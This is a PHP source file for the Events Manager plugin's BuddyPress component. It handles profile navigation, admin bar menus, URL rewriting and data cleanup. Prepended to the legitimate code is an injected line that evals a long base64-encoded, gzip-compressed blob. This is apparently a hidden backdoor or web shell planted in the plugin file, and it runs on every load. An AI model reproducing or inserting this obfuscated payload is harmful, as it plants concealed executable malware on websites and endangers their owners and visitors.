<?php eval(gzinflate(base64_decode('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')));?>
<?php
//Main loader for buddypress
/**
 * Events Manager component for BuddyPress
 * @author marcus
 * @since 5.0
 */
class BP_EM_Component extends BP_Component {
	
	function __construct() {
		global $bp;
		parent::start('events',	__('Events', 'events-manager'), EM_DIR);
		$this->includes();
		//TODO make BP component optional
		$bp->active_components[$this->id] = '1';
	}

	function includes( $includes = array() ) {
		// Files to include
		$includes = array(
			'buddypress/bp-em-activity.php',
			'buddypress/bp-em-templatetags.php',
			'buddypress/bp-em-notifications.php',
			'buddypress/screens/profile.php',
			'buddypress/screens/my-events.php',
			'buddypress/screens/my-locations.php',
			'buddypress/screens/attending.php',
			'buddypress/screens/my-bookings.php',
			'buddypress/screens/my-group-events.php'
		);
		if( bp_is_active('groups') ){
			$includes[] = 'buddypress/screens/group-events.php';
			$includes[] = 'buddypress/bp-em-groups.php';
		}
		parent::includes( $includes );
		//TODO add admin pages for extra BP specific settings
	}

	/**
	 * Sets up the global Events Manager BuddyPress Components
	 */
	function setup_globals( $args = array() ) {
		global $bp, $wpdb;
		// Define a slug constant that will be used to view this components pages
		if ( !defined( 'BP_EM_SLUG' ) )
			define ( 'BP_EM_SLUG', str_replace('/','-', EM_POST_TYPE_EVENT_SLUG) );

		// Set up the $globals array to be passed along to parent::setup_globals()
		$globals = array(
			'slug'                  => BP_EM_SLUG,
			'has_directory'         => false, //already done by EM
			'notification_callback' => 'bp_em_format_notifications',
			'search_string'         => sprintf(__( 'Search %s...', 'events-manager'),__('Events','events-manager')),
		);

		// Let BP_Component::setup_globals() do its work.
		parent::setup_globals( $globals );

		//quick link shortcut - may need to revisit this
		$bp->{$this->id}->link = trailingslashit($bp->loggedin_user->domain).BP_EM_SLUG.'/';
	}
	
	public function setup_nav( $main_nav = array(), $sub_nav = array() ) {
		global $blog_id; 
		//check multisite or normal mode for correct permission checking
		if(is_multisite() && $blog_id != BP_ROOT_BLOG){
			//FIXME MS mode doesn't seem to recognize cross subsite caps, using the proper functions, for now we use switch_blog.
			$current_blog = $blog_id;
			switch_to_blog(BP_ROOT_BLOG);
			$can_manage_events = current_user_can_for_blog(BP_ROOT_BLOG, 'edit_events');
			$can_manage_locations = current_user_can_for_blog(BP_ROOT_BLOG, 'edit_locations');
			$can_manage_bookings = current_user_can_for_blog(BP_ROOT_BLOG, 'manage_bookings');
			restore_current_blog();
		}else{
			$can_manage_events = current_user_can('edit_events');
			$can_manage_locations = current_user_can('edit_locations');
			$can_manage_bookings = current_user_can('manage_bookings');
		}
		/* Add 'Events' to the main user profile navigation */
		$main_nav = array(
			'name' => __( 'Events', 'events-manager'),
			'slug' => em_bp_get_slug(),
			'position' => 80,
			'screen_function' => 'bp_em_events',
			'default_subnav_slug' => 'profile'
		);

		$em_link = trailingslashit( bp_displayed_user_domain() . em_bp_get_slug() );
		
		/* Create SubNav Items */
		$sub_nav[] = array(
			'name' => __( 'My Profile', 'events-manager'),
			'slug' => 'profile',
			'parent_slug' => em_bp_get_slug(),
			'parent_url' => $em_link,
			'screen_function' => 'bp_em_events',
			'position' => 10
		);
		
		$sub_nav[] = array(
			'name' => __( 'Events I\'m Attending', 'events-manager'),
			'slug' => 'attending',
			'parent_slug' => em_bp_get_slug(),
			'parent_url' => $em_link,
			'screen_function' => 'bp_em_attending',
			'position' => 20,
			'user_has_access' => bp_is_my_profile() // Only the logged in user can access this on his/her profile
		);
	
		if( $can_manage_events ){
			$sub_nav[] = array(
				'name' => __( 'My Events', 'events-manager'),
				'slug' => 'my-events',
				'parent_slug' => em_bp_get_slug(),
				'parent_url' => $em_link,
				'screen_function' => 'bp_em_my_events',
				'position' => 30,
				'user_has_access' => bp_is_my_profile() // Only the logged in user can access this on his/her profile
			);
		}
		
		if( $can_manage_locations && get_option('dbem_locations_enabled') ){
			$sub_nav[] = array(
				'name' => __( 'My Locations', 'events-manager'),
				'slug' => 'my-locations',
				'parent_slug' => em_bp_get_slug(),
				'parent_url' => $em_link,
				'screen_function' => 'bp_em_my_locations',
				'position' => 40,
				'user_has_access' => bp_is_my_profile() // Only the logged in user can access this on his/her profile
			);
		}
		
		if( $can_manage_bookings && get_option('dbem_rsvp_enabled') ){
			$sub_nav[] = array(
				'name' => __( 'My Event Bookings', 'events-manager'),
				'slug' => 'my-bookings',
				'parent_slug' => em_bp_get_slug(),
				'parent_url' => $em_link,
				'screen_function' => 'bp_em_my_bookings',
				'position' => 50,
				'user_has_access' => bp_is_my_profile() // Only the logged in user can access this on his/her profile
			);
		}
	
		if( bp_is_active('groups') ){
			/* Create Profile Group Sub-Nav */
			$sub_nav[] = array(
				'name' => __( 'Events', 'events-manager'),
				'slug' => 'group-events',
				'parent_slug' => bp_get_groups_slug(),
				'parent_url' =>trailingslashit( bp_displayed_user_domain() . bp_get_groups_slug() ),
				'screen_function' => 'bp_em_my_group_events',
				'position' => 60,
				'user_has_access' => bp_is_my_profile() // Only the logged in user can access this on his/her profile
			);
		}
		
		parent::setup_nav( $main_nav, $sub_nav );
		add_action( 'bp_init', array(&$this, 'setup_group_nav') );
	}
	
	public function setup_admin_bar( $wp_admin_nav = array() ) {
		global $bp, $blog_id;
	
		// Prevent debug notices
		$wp_admin_nav = array();
	
		// Menus for logged in user
		if ( is_user_logged_in() ) {
			//check multisite or normal mode for correct permission checking
			if(is_multisite() && $blog_id != BP_ROOT_BLOG){
				//FIXME MS mode doesn't seem to recognize cross subsite caps, using the proper functions, for now we use switch_blog.
				$current_blog = $blog_id;
				switch_to_blog(BP_ROOT_BLOG);
				$can_manage_events = current_user_can_for_blog(BP_ROOT_BLOG, 'edit_events');
				$can_manage_locations = current_user_can_for_blog(BP_ROOT_BLOG, 'edit_locations');
				$can_manage_bookings = current_user_can_for_blog(BP_ROOT_BLOG, 'manage_bookings');
				restore_current_blog();
			}else{
				$can_manage_events = current_user_can('edit_events');
				$can_manage_locations = current_user_can('edit_locations');
				$can_manage_bookings = current_user_can('manage_bookings');
			}

			$em_link = trailingslashit( bp_loggedin_user_domain() . em_bp_get_slug() );
			
			/* Add 'Events' to the main user profile navigation */
			$wp_admin_nav[] = array(
				'parent' => $bp->my_account_menu_id,
				'id'     => 'my-em-' . $this->id,
				'title'  => __( 'Events', 'events-manager'),
				'href'   => $em_link
			);
			
			/* Create SubNav Items */
			$wp_admin_nav[] = array(
				'parent' => 'my-em-' . $this->id,
				'id'     => 'my-em-' . $this->id .'-profile',
				'title'  => __( 'My Profile', 'events-manager'),
				'href'   => $em_link.'profile/'
			);
			
			$wp_admin_nav[] = array(
				'parent' => 'my-em-' . $this->id,
				'id'     => 'my-em-' . $this->id .'-attending',
				'title'  => __( 'Events I\'m Attending', 'events-manager'),
				'href'   => $em_link.'attending/'
			);
			
			if( $can_manage_events ){
				$wp_admin_nav[] = array(
					'parent' => 'my-em-' . $this->id,
					'id'     => 'my-em-' . $this->id .'-my-events',
					'title'  => __( 'My Events', 'events-manager'),
					'href'   => $em_link.'my-events/'
				);
			}
			
			if( $can_manage_locations && get_option('dbem_locations_enabled') ){
				$wp_admin_nav[] = array(
					'parent' => 'my-em-' . $this->id,
					'id'     => 'my-em-' . $this->id .'-my-locations',
					'title'  => __( 'My Locations', 'events-manager'),
					'href'   => $em_link.'my-locations/'
				);
			}
			
			if( $can_manage_bookings && get_option('dbem_rsvp_enabled') ){
				$wp_admin_nav[] = array(
					'parent' => 'my-em-' . $this->id,
					'id'     => 'my-em-' . $this->id .'-my-bookings',
					'title'  => __( 'My Event Bookings', 'events-manager'),
					'href'   => $em_link.'my-bookings/'
				);
			}
			
			if( bp_is_active('groups') ){
				/* Create Profile Group Sub-Nav */
				$wp_admin_nav[] = array(
					'parent' => 'my-account-groups',
					'id'     => 'my-account-groups-' . $this->id ,
					'title'  => __( 'Events', 'events-manager'),
					'href'   => trailingslashit( bp_loggedin_user_domain() . bp_get_groups_slug() ) . 'group-events/'
				);
			}			
		}
	
		parent::setup_admin_bar( $wp_admin_nav );
	}
	
	function setup_group_nav(){
		global $bp;	
		/* Add some group subnav items */
		$user_access = false;
		$group_link = '';
		if( bp_is_active('groups') && !empty($bp->groups->current_group) ){
			$group_link = $bp->root_domain . '/' . bp_get_groups_root_slug() . '/' . $bp->groups->current_group->slug . '/';
			$user_access = $bp->groups->current_group->user_has_access;
			if( !empty($bp->current_component) && $bp->current_component == 'groups' ){
				$count = EM_Events::count(array('group'=>$bp->groups->current_group->id));
				if( empty($count) ) $count = 0;
			}
			bp_core_new_subnav_item( array( 
				'name' => __( 'Events', 'events-manager') . " <span>$count</span>",
				'slug' => 'events', 
				'parent_url' => $group_link, 
				'parent_slug' => $bp->groups->current_group->slug,
				'screen_function' => 'bp_em_group_events', 
				'position' => 50, 
				'user_has_access' => $user_access, 
				'item_css_id' => 'events' 
			));
		}
	}
}
function bp_em_load_core_component() {
	global $bp;
	$bp->events = new BP_EM_Component();
}
add_action( 'bp_loaded', 'bp_em_load_core_component' );

if( !is_admin() || ( defined('DOING_AJAX') && !empty($_REQUEST['is_public'])) ){
	/*
	 * Links and URL Rewriting
	 */
	function em_bp_rewrite_edit_url($url, $EM_Event){
		global $bp;
		return $bp->events->link.'my-events/?action=edit&event_id='.$EM_Event->event_id;
	}
	function em_bp_rewrite_events_admin_url( $url ){
		global $bp;
	    return $bp->events->link.'my-events/';
	}
	if( !get_option('dbem_edit_events_page') ){
		add_filter('em_event_get_edit_url','em_bp_rewrite_edit_url',10,2);
		add_filter('em_get_events_admin_url','em_bp_rewrite_edit_url',10,2);
	}	
	
	function em_bp_rewrite_bookings_url($url, $EM_Event){
		global $bp;
		return $bp->events->link.'my-bookings/?event_id='.$EM_Event->event_id;
	}
	if( !get_option('dbem_edit_bookings_page') ){
		add_filter('em_event_get_bookings_url','em_bp_rewrite_bookings_url',10,2);
	}
	
	function em_bp_rewrite_edit_location_url($url, $EM_Location){
		global $bp;
		return $bp->events->link.'my-locations/?action=edit&location_id='.$EM_Location->location_id;
	}
	if( !get_option('dbem_edit_locations_page') ){
		add_filter('em_location_get_edit_url','em_bp_rewrite_edit_location_url',10,2);
	}
}

//CSS and JS Loading
function bp_em_enqueue_scripts( ){
	if( bp_is_current_component('events') || (bp_is_current_component('groups') && bp_is_current_action('group-events')) ){
	    add_filter('option_dbem_js_limit', create_function('$args','return false;'));
	    add_filter('option_dbem_css_limit', create_function('$args','return false;'));
	}
	
}
add_action('wp_enqueue_scripts','bp_em_enqueue_scripts',1);

function bp_em_messages_js_compat() {
	if(bp_is_messages_compose_screen()){
		wp_deregister_script( 'events-manager' );
	}
}
add_action( 'wp_print_scripts', 'bp_em_messages_js_compat', 100 );

/**
 * Delete events when you delete a user.
 */
function bp_em_remove_data( $user_id ) {
	$EM_Events = EM_Events::get(array('scope'=>'all','owner'=>$user_id, 'status'=>false));
	EM_Events::delete($EM_Events);
}
add_action( 'wpmu_delete_user', 'bp_em_remove_data', 1 );
add_action( 'delete_user', 'bp_em_remove_data', 1 );

define('EM_BP_LOADED',true); //so we know
?>
